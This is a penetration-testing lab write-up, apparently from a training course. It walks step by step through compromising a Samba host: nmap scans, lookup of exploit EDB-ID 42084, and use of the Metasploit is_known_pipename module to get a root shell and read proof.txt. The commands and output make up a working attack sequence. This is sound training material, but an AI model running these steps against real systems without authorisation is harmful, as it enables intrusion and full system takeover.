Report

Report

1. SYN Stealth scan for all TCP ports reveals 3 open ports: 22, 139, 445.
a Linux OS with hostname SUSIE, that uses Samba.
`sudo nmap -p- 10.11.1.146`
![81538095cd5a26224c0cf8b548589c2f.png](d3b8ed738ef34b8db1bcead8cb73d2bc.png)


2. Run a deeper scan using the aggressive aggressive  run scripts for default, safe, auth, and vuln. The
`sudo nmap -p22,139,445 -A -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.146`
![0c3d4546e450278f2b7bfd5fd326a091.png](edfdcabc3c654c44a124534b258e23b8.png)
![143739cbfb0f9e60c642895bf944c75d.png](716c30d516e8452faa12a29971b7fbb9.png)
![20c11293e616adcc67869155087a3195.png](fec591de9e174fa78377dfe0716c35d7.png)
![044e5dc83962c14d128b014185a251f3.png](8bb3ad81c02c4ad0a3b71c6b903ae709.png)

The critical piece of info here comes from the smb-os-discovery output which specifies the OS and Samba version
![dd1f3fab7ff02c6aa9f1c21f3620f827.png](8326860e30d54d78a04c981fb76d30c2.png)


3. Google search the output from smb-os-discovery (ie. OS and Samba version)
Search term: **Windows 6.1 Samba 4.5.4-Ubuntu**
![f27feb82fd6919ae980bd04c2e12da24.png](091067f092e84d68b2e5ce80bfc4e443.png)


4. Click the second hit which is the exploit-db link. **EDB-ID: 42084**
Notice that it requires metasploit. 
[https://www.exploit-db.com/exploits/42084](https://www.exploit-db.com/exploits/42084)
![fcdb5d383e631e27df6583abae8d5c24.png](8ccda3ef126749b0afb9dd3930338316.png)


5. Start the postgresql database
`sudo systemctl start postgresql`
![ef4ab97277add13b2bc1cd646292d5d2.png](8b1c5b92c820422192dc25ee1b7daea8.png)


6. Start the msfconsole without ascii banner
`sudo msfconsole -q`
![3710302d0e3b97a84f426224148358e1.png](23cdbb08cf3b4162b47e0f25159fa286.png)


7. Search for 'is_known_pipename' and select it
`search is_known_pipename`
`use 0`
![fc671fb1320e3d07bdfe356d84bf1762.png](9d90dfd96a6942c58a19cb9cb9ff2f66.png)


8. Show options
`show options`
![b67f269120215822a7ed5db93429fba4.png](b909bf89916247c48c809d9294389561.png)


9. Change rhosts to the target IP
`set rhosts 10.11.1.146`
![2f44954c05e03950ccd762cdaeb8b5dc.png](f011e99cadb341fabe493c6a46fc38d8.png)


10. Verify that the change to rhosts was made
`show options`
![80d6e41722be9fb0accaf72821fe96bf.png](558b14cad85c4c80b0b5ba0a10575cd0.png)


11. Check to see if the exploit will work
`check`
![d1595f32639d3171eefc2a4cf72f42a2.png](7ec8039d19e94057ae7cf4335bcc79f2.png)


12. Run the exploit command. We get a command shell
`exploit`
![8afe6b6b2fd68338f606b1eb9a5ead00.png](f2b7e96acf394349a4f6bbe89a17edac.png)

13. Attempt to get an interactive shell
`shell`
![5742aa656f27f223fb9c6f42a36d4670.png](78aa4abe2ca642be85fec3bf90620872.png)


13. Check user, get IP address, and display proof.txt
`whoami`
`ifconfig`
`cat /root/proof.txt`

```plaintext
whoami
whoami
root
# ifconfig
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.11.1.146  netmask 255.255.0.0  broadcast 10.11.255.255
        inet6 fe80::250:56ff:fe8a:d300  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:8a:d3:00  txqueuelen 1000  (Ethernet)
        RX packets 158708  bytes 12168574 (12.1 MB)
        RX errors 0  dropped 49  overruns 0  frame 0
        TX packets 26694  bytes 8510818 (8.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 727  bytes 60903 (60.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 727  bytes 60903 (60.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

# cat /root/proof.txt
cat /root/proof.txt
78279a04f7020f4fb4599242fcfe70af
# 
```

![e5090f35be96e287798693c1a4d36e33.png](fb63b7e418fe49ccb5d5c9d5bae0c3fd.png)








